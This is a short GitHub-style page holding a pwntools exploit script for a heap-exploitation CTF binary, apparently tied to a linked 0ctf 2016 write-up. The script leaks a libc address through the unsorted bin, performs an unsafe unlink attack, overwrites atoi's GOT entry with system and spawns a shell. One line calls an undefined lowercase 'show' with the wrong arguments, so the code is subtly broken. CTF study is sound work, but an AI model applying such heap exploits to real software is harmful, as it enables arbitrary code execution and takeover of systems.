# Container images, text,... for my Github.

```python 
#!/usr/bin/env python3 

store = 0x6020e0
storeSize = 0x602140

from pwn import *

elf = ELF('./vuln')
libc = ELF('./libc.2.23.so')
context.log_level = 'DEBUG'

p = elf.process()


gdb.attach(p, '''
	b *createHeap
	b *showHeap
	b *deleteHeap
	b *editHeap
''')

def Create(index, size, data):
        p.sendlineafter(b'>', str(1))
        p.sendlineafter(b'Index:', str(index))
        p.sendlineafter(b'size:', str(size))
        p.sendlineafter(b'data:', data)

def Show(index):
        p.sendlineafter(b'>', str(2))
        p.sendlineafter(b'Index:', str(index))
        p.recvuntil(b'Data = ')
        leak = p.recvuntil(b'\n')
        return u64(leak.replace(b'\n', b'').ljust(8, b'\x00'))

def Edit(index, newSize, data):
        p.sendlineafter(b'>', str(3))
        p.sendlineafter(b'index:', str(index))
        p.sendlineafter(b'newsize:', str(newSize))
        p.recvline()
        p.sendline(b'y')
        p.sendlineafter(b'data:', data)

def Delete(index):
        p.sendlineafter(b'>', str(4))
        p.sendlineafter(b'index:', str(index))


# leak main_arena with unsorted bin
## ngăn chặn chunk consolidate
Create(0,0x68,b'a')
Create(1,400,b'a')
Create(2,0x68,b'a')
Delete(1)

# fill các null byte để có thể in địa chỉ main arena ra được
Edit(0,0x70,b'a'*0x70)  
main_arena = u64(show(0,b'a'*0x70).strip().ljust(8,b'\x00'))
libc.address = main_arena - 0x39bb78
log.info('libc.address: ' + hex(libc.address))
Edit(0,0x70,b'a'*0x68 + p64(0x1a1))    
 # sau khi leak xong cần sửa lại size của chunk đằng sau để có thể free được
Create(1,400,b'a')


# unsafe unlink attack
Create(3,0x88,b'a')
Create(4,0x88,b'a')
payload = b''
payload += p64(0) + p64(0) 
payload += p64(store + 3*8 -8*3) + p64(store + 3*8 -8*2) 
payload += b'a'*0x60 + p64(0x80) + p64(0x90)
Edit(3,0x90, payload)
Delete(4)

# At this point we can use "store" to overwrite itself to point to an arbitrary location
Edit(3,0x90, p64(0) + p64(0) + p64(0) + p64(elf.got['atoi']))

# modify atoi got to system
Edit(3,0x90,p64(libc.symbols['system']))
p.send(b'/bin/sh\x00')


p.interactive()

```



https://dangokyo.me/2017/12/14/0ctf-2016-quals-pwn-zerostorage-write-up/


